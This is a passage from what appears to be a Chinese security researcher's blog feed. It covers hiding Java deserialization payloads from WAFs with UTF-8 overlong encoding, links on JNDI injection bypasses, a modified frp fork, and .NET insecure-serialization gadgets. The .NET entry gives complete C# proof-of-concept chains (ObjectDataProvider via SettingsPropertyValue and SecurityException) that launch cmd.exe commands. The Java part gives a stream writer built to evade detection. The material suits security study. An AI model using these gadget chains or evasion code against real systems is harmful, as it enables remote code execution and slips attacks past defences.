class="string">&#x27;W&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x97</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;X&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x98</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x99</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9a</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"><span class="comment">//        writeUTF(desc.getName());</span></span><br><span class="line">        writeShort(name.length() * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> name.charAt(i);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">            write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">            write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        writeLong(desc.getSerialVersionUID());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;externalizable&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">protocolField</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;protocol&quot;</span>);</span><br><span class="line">                protocolField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">protocol</span> <span class="operator">=</span> (<span class="type">int</span>) protocolField.get(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;serializable&quot;</span>))&#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;hasWriteObjectData&quot;</span>)) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">boolean</span>)getFieldValue(desc,<span class="string">&quot;isEnum&quot;</span>) ) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">            &#125;</span><br><span class="line">            writeByte(flags);</span><br><span class="line">            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,<span class="string">&quot;fields&quot;</span>);</span><br><span class="line">            writeShort(fields.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line">                writeByte(f.getTypeCode());</span><br><span class="line">                writeUTF(f.getName());</span><br><span class="line">                <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">writeTypeString</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="string">&quot;writeTypeString&quot;</span>,String.class);</span><br><span class="line">                    writeTypeString.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    writeTypeString.invoke(<span class="built_in">this</span>,f.getTypeString());</span><br><span class="line"><span class="comment">//                    writeTypeString(f.getTypeString());</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> field.get(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240504171820134.png" alt="image-20240504171820134"></p><p>就全部都看不见了    </p><p>hessian也有同样的问题  参考<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p><p><strong>(因为他用的是自己的反序列化方法)</strong></p><p>参考文章</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></li><li><a href="https://wx.zsxq.com/dweb2/index/topic_detail/188821885558212">https://wx.zsxq.com/dweb2/index/topic_detail/188821885558212</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学习一下这个知识点  可以用来绕过对java反序列化的检测的WAF&lt;/p&gt;
&lt;p&gt;首先我们来看一下序列化后的数据是长什么样的&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="java" scheme="https://ke1nys.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Jndi高版本绕过</title>
    <link href="https://ke1nys.github.io/posts/e06d273a.html"/>
    <id>https://ke1nys.github.io/posts/e06d273a.html</id>
    <published>2024-05-03T09:28:45.000Z</published>
    <updated>2024-06-05T07:35:10.103Z</updated>
    
    <content type="html"><![CDATA[<p>下面这几篇文章总结的很好了  就不自己写了</p><p><a href="https://tttang.com/archive/1405/#toc_dbcp">https://tttang.com/archive/1405/#toc_dbcp</a>  这个是jndi高版本绕过的方法</p><p><a href="https://tttang.com/archive/1611/#toc_jdk_2">https://tttang.com/archive/1611/#toc_jdk_2</a> 这个是解释了jndi并且稍微带了点绕过方法</p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC?tab=readme-ov-file#dbcp-h2">https://github.com/luelueking/Deserial_Sink_With_JDBC?tab=readme-ov-file#dbcp-h2</a>   JDK高版本RCE的方法(JDBC)</p><p><a href="https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/#derby">https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/#derby</a>  在Jndi注入中加入了个Derby的JDBC绕过</p><p><a href="https://vidar-team.feishu.cn/docx/PL7IdIkFCoBYhYxxFXVc5j72nKo">https://vidar-team.feishu.cn/docx/PL7IdIkFCoBYhYxxFXVc5j72nKo</a>  这个实战文章中加了个HIKARI 的工厂类</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下面这几篇文章总结的很好了  就不自己写了&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1405/#toc_dbcp&quot;&gt;https://tttang.com/archive/1405/#toc_dbcp&lt;/a&gt;  这个是jndi高版</summary>
      
    
    
    
    
    <category term="java" scheme="https://ke1nys.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>frp-二开</title>
    <link href="https://ke1nys.github.io/posts/99d00ea3.html"/>
    <id>https://ke1nys.github.io/posts/99d00ea3.html</id>
    <published>2024-05-01T10:14:33.000Z</published>
    <updated>2024-05-01T10:17:05.606Z</updated>
    
    <content type="html"><![CDATA[<p>自己二开了个frp  版本<code>0.51.2</code></p><p><a href="https://github.com/ke1nys/frp">https://github.com/ke1nys/frp</a></p><p>大佬们觉得好用的话可以点个star</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己二开了个frp  版本&lt;code&gt;0.51.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ke1nys/frp&quot;&gt;https://github.com/ke1nys/frp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大佬们觉得好用的话可以点个sta</summary>
      
    
    
    
    
    <category term="frp" scheme="https://ke1nys.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>frp二开</title>
    <link href="https://ke1nys.github.io/posts/b1a19a3b.html"/>
    <id>https://ke1nys.github.io/posts/b1a19a3b.html</id>
    <published>2024-05-01T10:12:55.000Z</published>
    <updated>2024-05-01T10:17:05.608Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>dotnet Insecure Serialization</title>
    <link href="https://ke1nys.github.io/posts/177f810b.html"/>
    <id>https://ke1nys.github.io/posts/177f810b.html</id>
    <published>2024-04-17T09:26:14.000Z</published>
    <updated>2024-04-18T12:57:04.537Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception">https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception</a></p><p>前面的介绍上面的链接已经写的很详细了  这里就不写了  </p><p>下面的反序列化操作全是在序列化的时候  调用getter来进行完成的</p><h1 id="NET-Framework"><a href="#NET-Framework" class="headerlink" title=".NET Framework"></a>.NET Framework</h1><h2 id="SettingsPropertyValue"><a href="#SettingsPropertyValue" class="headerlink" title="SettingsPropertyValue"></a>SettingsPropertyValue</h2><p>序列化时触发 BinaryFormatter 反序列化</p><p>先看其getter方法</p><p><img src="../images/image-20240417195326690.png" alt="image-20240417195326690"></p><p>进入到这个Deserialize函数中去()</p><p><img src="../images/image-20240417195519687.png" alt="image-20240417195519687"></p><p><img src="../images/image-20240417195809577.png" alt="image-20240417195809577"></p><p>这里有两个if判断  并且是有两个反序列化点 </p><ul><li>this.SerializedValue的值为String类型的话  就会进入到这个GetObjectFromString函数中  这里面的话也可以进行BinaryFormatter反序列化</li><li>第二个就是this.SerializedValue为Byte[]类型的话  就会进入到下面的这个BinaryFormatter来进行反序列化操作</li></ul><p><img src="../images/image-20240417200100832.png" alt="image-20240417200100832"></p><p>刚好这个this.SerializedValue的值就是我们反序列化的内容</p><p>最终POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="comment">// using ConsoleApp.Gadget;</span></span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System.Configuration;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> ConsoleApp.InsecureSerialization;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp.InsecureSerialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SettingsPropertyValueDemo</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal textFormattingRunProperties = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream mem = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(mem, textFormattingRunProperties);</span><br><span class="line"></span><br><span class="line">                data = mem.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SettingsProperty property = <span class="keyword">new</span> SettingsProperty(<span class="string">&quot;test&quot;</span>);<span class="comment">//用这个的目的只是为了给SettingsPropertyValue构造函数传值</span></span><br><span class="line">            </span><br><span class="line">            SettingsPropertyValue settingsPropertyValue = <span class="keyword">new</span> SettingsPropertyValue(property);</span><br><span class="line">            settingsPropertyValue.Deserialized = <span class="literal">false</span>;</span><br><span class="line">            settingsPropertyValue.SerializedValue = data;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Console.Write(settingsPropertyValue.PropertyValue);</span></span><br><span class="line"></span><br><span class="line">            JsonSerializerSettings settings = <span class="keyword">new</span> JsonSerializerSettings</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.All,</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            JsonConvert.SerializeObject(settingsPropertyValue, settings);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SecurityException"><a href="#SecurityException" class="headerlink" title="SecurityException"></a>SecurityException</h2><p>序列化时触发 BinaryFormatter 反序列化</p><p>还是先看其getter方法</p><p><img src="../images/image-20240417202605443.png" alt="image-20240417202605443"></p><p>跟进getMethod函数中去</p><p><img src="../images/image-20240417202634658.png" alt="image-20240417202634658"></p><p>根据这个函数名字  字节数组转成对象  一猜就知道这个函数里面实现了反序列化操作  跟进</p><p><img src="../images/image-20240417202731928.png" alt="image-20240417202731928"></p><p>对传入的序列化字节数组进行Binary反序列化操作</p><p>但是这里的话有点问题就是</p><p><img src="../images/image-20240417203133985.png" alt="image-20240417203133985"></p><p>其实说白了就是这里的setter方法在反序列化的时候会被调用来进行给<code>m_serializedMethodInfo</code>赋值  会给我们刚开始传入的值给覆盖掉  但是利用失败</p><p><img src="../images/image-20240417203433761.png" alt="image-20240417203433761"></p><p>就是这里有问题</p><p>部分序列化器在反序列化恢复字段时会调用 Method setter, 导致覆盖 m_serializedMethodInfo 的内容, 无法触发恶意 Gadget</p><p>因此需要某个不完全依赖于 setter 赋值的序列化器, 例如 BinaryFormatter/Json.Net, 都支持调用特殊的反序列化构造函数</p><p><img src="../images/image-20240417203611917.png" alt="image-20240417203611917"></p><p>说白了就是这个调用这个类的构造函数可以替代setter方法  在反序列化的时候就不会导致m_serializedMethodInfo的值被覆盖</p><p>另外后续序列化时所使用的序列化器应当直接调用 Method getter, 而不是 GetObjectData 方法</p><p>POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="comment">// using ConsoleApp.Gadget;</span></span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> ConsoleApp.InsecureSerialization;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp.InsecureSerialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SecurityExceptionDemo</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal textFormattingRunProperties = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream mem = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(mem, textFormattingRunProperties);</span><br><span class="line"></span><br><span class="line">                data = mem.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SecurityException securityException = <span class="keyword">new</span> SecurityException();</span><br><span class="line">            <span class="keyword">typeof</span>(SecurityException)</span><br><span class="line">                .GetField(<span class="string">&quot;m_serializedMethodInfo&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic)</span><br><span class="line">                .SetValue(securityException, data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Console.Write(securityException.Method);</span></span><br><span class="line"></span><br><span class="line">            JavaScriptSerializer javaScriptSerializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            javaScriptSerializer.Serialize(securityException);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JavaScriptSerializer进行序列化操作的话  调用的是getter方法  而不是GetObjectData方法</p><h2 id="CompilerResults"><a href="#CompilerResults" class="headerlink" title="CompilerResults"></a>CompilerResults</h2><p>序列化时触发本地 DLL 加载 (Assembly.Load), 类似 